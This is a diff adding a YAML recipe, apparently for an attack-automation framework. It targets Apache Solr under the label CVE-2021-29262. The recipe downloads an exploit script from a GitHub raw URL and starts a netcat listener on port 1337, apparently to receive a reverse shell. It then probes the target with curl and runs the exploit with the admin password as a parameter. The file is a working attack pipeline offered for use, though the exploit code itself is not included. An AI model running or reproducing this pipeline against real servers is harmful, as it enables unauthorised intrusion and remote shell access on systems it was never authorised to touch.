@@ -1,0 +1,44 @@
+name: Apache Solr CVE-2021-29262
+params:
+  - name: target_admin_password
+    description: Web panel admin user password
+    type: string
+    required: true
+  - name: target_port
+    description: Web server port
+    type: int
+    default: 8983
+
+workspace:
+  - target: exploit.py
+    source: https://raw.githubusercontent.com/Memoryo3o/Exploit.py/main/Apache%20Solr.py
+
+services:
+  - name: TCP Listener
+    image: alpine:latest
+    ports:
+      - name: listener_port
+        port: 1337
+    command: nc -lvnp 1337
+
+steps:
+  - name: Check available
+    image: curlimages/curl:latest
+    environment:
+      RHOST:
+        from_param: target_host
+      RPORT:
+        from_param: target_port
+    commands:
+      - curl -f -v http://$$RHOST:$$RPORT/solr/
+
+  - name: Exploit
+    image: python:3-alpine
+    environment:
+      RHOST:
+        from_param: target_host
+      RPORT:
+        from_param: target_port
+    commands:
+      - pip install requests
+      - python exploit.py http://$$RHOST:$$RPORT/
